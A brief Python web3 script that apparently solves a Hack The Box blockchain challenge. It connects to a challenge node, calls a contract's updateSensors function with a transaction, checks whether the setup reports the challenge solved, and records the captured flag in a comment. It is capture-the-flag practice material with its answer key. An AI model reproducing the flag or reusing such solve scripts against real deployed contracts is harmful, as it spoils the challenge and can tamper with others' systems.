from web3 import Web3

abi = '''[
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "version",
				"type": "uint256"
			}
		],
		"name": "updateSensors",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "updated",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]'''

abi2 = '''[
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract Unknown",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]'''

w3 = Web3(Web3.HTTPProvider('http://159.65.81.51:30417'))
contract = w3.eth.contract(address='0xA08Ec9a121550BF1BE3860F673DfE42b913EBd32', abi=abi)
setup = w3.eth.contract(address='0x74b7aA986c1F3A72c1D10E46e600b1F5B385C47B', abi=abi2)
# OK!! I just needed to use transact() for this function
# HTB{9P5_50FtW4R3_UPd4t3D}
print(contract.functions.updateSensors(10).transact())
print(setup.functions.isSolved().call())
print(contract.functions.updated().call())
